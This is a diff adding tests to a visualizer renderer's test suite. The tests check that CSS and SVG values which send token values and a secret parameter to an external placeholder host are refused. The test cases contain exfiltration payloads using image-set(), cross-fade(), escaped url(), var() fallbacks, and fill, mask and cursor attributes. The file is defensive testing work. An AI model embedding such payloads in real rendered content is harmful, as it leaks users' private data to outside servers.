@@ -99,6 +99,123 @@ describe("renderVisualizerHir", () => {
     ).toThrow(/url\(#id\)/u);
   });
 
+  /**
+   * Each of these passes the lowering and its checker, since the value is
+   * computed, and builds a destination from a token value and a parameter.
+   * The renderer must refuse it before any React element exists.
+   */
+  describe("refuses a resource computed from tokens and parameters", () => {
+    const privateContext: HirVisualizerContext = {
+      surface: "visualizer",
+      parameters: [{ name: "secret", type: "real" }],
+      elements: [{ name: "x", type: "real" }],
+    };
+    // The placeholders belong to the visualizer source, which interpolates them.
+    const destination =
+      // eslint-disable-next-line no-template-curly-in-string -- see above
+      "https://visualizer-probe.invalid/?token=${token.x}&parameter=${parameters.secret}";
+
+    it.for([
+      {
+        case: "image-set()",
+        style: `background: \`image-set("${destination}" 1x)\``,
+      },
+      {
+        case: "-webkit-image-set() with url()",
+        style: `background: \`-webkit-image-set(url(${destination}) 1x)\``,
+      },
+      {
+        case: "image-set() layered after a gradient",
+        style: `background: \`linear-gradient(red, blue), image-set("${destination}" 1x)\``,
+      },
+      {
+        case: "image()",
+        style: `background: \`image("${destination}")\``,
+      },
+      {
+        case: "cross-fade()",
+        style: `background: \`cross-fade(url(${destination}) 50%, red)\``,
+      },
+      {
+        case: "an escaped url()",
+        style: `background: \`u\\\\72l("${destination}")\``,
+      },
+      {
+        case: "a function name assembled at run time",
+        style: `background: "image" + "-set(" + \`"${destination}" 1x)\``,
+      },
+      {
+        case: "a var() fallback",
+        style: `background: \`var(--missing, url(${destination}))\``,
+      },
+    ])("$case", ({ style }) => {
+      const code = `export default Visualization(({ tokens, parameters }) => (
+  <svg>
+    {tokens.map((token) => <rect key={token.x} style={{ ${style} }} />)}
+  </svg>
+));`;
+      const lowered = lowerVisualizerToHir(code, privateContext);
+      expect(
+        lowered.ok ? [] : lowered.diagnostics.map((item) => item.message),
+      ).toEqual([]);
+      if (!lowered.ok) {
+        return;
+      }
+      expect(() =>
+        renderVisualizerHir(lowered.view, [{ x: 731 }], { secret: 42 }),
+      ).toThrow(
+        /`background` contains unsupported CSS or an external resource/u,
+      );
+    });
+
+    it.for(["fill", "mask", "cursor"])("in %s", (name) => {
+      const attribute =
+        name === "cursor"
+          ? `style={{ cursor: \`url(${destination}) 0 0, auto\` }}`
+          : `${name}={\`url(${destination})\`}`;
+      const code = `export default Visualization(({ tokens, parameters }) => (
+  <svg>
+    {tokens.map((token) => <rect key={token.x} ${attribute} />)}
+  </svg>
+));`;
+      const lowered = lowerVisualizerToHir(code, privateContext);
+      expect(lowered.ok).toBe(true);
+      if (!lowered.ok) {
+        return;
+      }
+      expect(() =>
+        renderVisualizerHir(lowered.view, [{ x: 731 }], { secret: 42 }),
+      ).toThrow(`\`${name}\` contains unsupported CSS or an external resource`);
+    });
+  });
+
+  it("draws computed gradients, transforms and fragment references", () => {
+    expect(
+      render(
+        `export default Visualization(({ tokens }) => (
+  <g transform={\`rotate(\${tokens.length * 10} 5 5)\`}>
+    <rect
+      fill={\`url(#gradient-\${tokens.length})\`}
+      style={{ background: \`linear-gradient(90deg, rgba(0, 0, 0, \${tokens.length / 2}), #fff)\` }}
+    />
+  </g>
+));`,
+      ),
+    ).toBe(
+      '<g transform="rotate(10 5 5)"><rect fill="url(#gradient-1)" style="background:linear-gradient(90deg, rgba(0, 0, 0, 0.5), #fff)"></rect></g>',
+    );
+  });
+
+  it("draws computed clipping shapes", () => {
+    expect(
+      render(
+        `export default Visualization(({ tokens }) => (
+  <svg><rect clipPath={\`circle(\${tokens.length * 10}px)\`} /></svg>
+));`,
+      ),
+    ).toBe('<svg><rect clip-path="circle(10px)"></rect></svg>');
+  });
+
   it("leaves a null attribute unset", () => {
     expect(
       render(
